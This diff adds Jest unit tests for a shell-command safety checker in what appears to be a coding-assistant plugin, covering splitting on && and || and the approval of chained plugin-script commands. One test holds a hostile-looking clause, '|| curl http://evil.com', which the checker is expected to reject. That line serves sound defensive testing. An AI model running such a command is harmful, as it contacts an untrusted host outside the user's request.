@@ -3550,3 +3550,78 @@ describe("isSafeCompoundCommand — quote-aware: complex edge cases", () => {
     ).toBe(true);
   });
 });
+
+// ---------------------------------------------------------------------------
+// Unit tests — splitByLogicalOperators
+// ---------------------------------------------------------------------------
+
+describe("splitByLogicalOperators", () => {
+  it("splits on &&", () => {
+    const result = splitByLogicalOperators("a && b", "a && b");
+    expect(result.map((r) => r.orig.trim())).toEqual(["a", "b"]);
+  });
+
+  it("splits on ||", () => {
+    const result = splitByLogicalOperators("a || b", "a || b");
+    expect(result.map((r) => r.orig.trim())).toEqual(["a", "b"]);
+  });
+
+  it("splits on mixed && and ||", () => {
+    const result = splitByLogicalOperators("a && b || c", "a && b || c");
+    expect(result.map((r) => r.orig.trim())).toEqual(["a", "b", "c"]);
+  });
+
+  it("does not split on || inside quoted string", () => {
+    const san = 'grep "  " file';
+    const orig = 'grep "||" file';
+    const result = splitByLogicalOperators(orig, san);
+    expect(result).toHaveLength(1);
+    expect(result[0].orig).toBe(orig);
+  });
+
+  it("handles ||| (three pipes) — splits on first ||, leaving | remainder (fail-safe)", () => {
+    const result = splitByLogicalOperators("a ||| b", "a ||| b");
+    // Splits at position 2 (||), leaving "a ", then "| b"
+    expect(result).toHaveLength(2);
+    expect(result[0].orig.trim()).toBe("a");
+    expect(result[1].orig.trim()).toBe("| b");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Unit tests — isCodingFriendCompound with || operator
+// ---------------------------------------------------------------------------
+
+describe("isCodingFriendCompound — || operator chains", () => {
+  it("allows CF script || echo fallback", () => {
+    expect(
+      isCodingFriendCompound(
+        `bash "${PLUGIN_ROOT}/lib/load-custom-guide.sh" cf-fix || echo "no guide"`,
+      ),
+    ).toBe(true);
+  });
+
+  it("allows CF script && echo done || echo failed", () => {
+    expect(
+      isCodingFriendCompound(
+        `bash "${PLUGIN_ROOT}/lib/load-custom-guide.sh" cf-tdd && echo done || echo failed`,
+      ),
+    ).toBe(true);
+  });
+
+  it("rejects || chain where non-CF clause is unsafe (curl)", () => {
+    expect(
+      isCodingFriendCompound(
+        `bash "${PLUGIN_ROOT}/lib/load-custom-guide.sh" cf-fix || curl http://evil.com`,
+      ),
+    ).toBe(false);
+  });
+
+  it("rejects || with empty first clause (|| at start)", () => {
+    expect(
+      isCodingFriendCompound(
+        `|| bash "${PLUGIN_ROOT}/lib/load-custom-guide.sh" cf-fix`,
+      ),
+    ).toBe(false);
+  });
+});
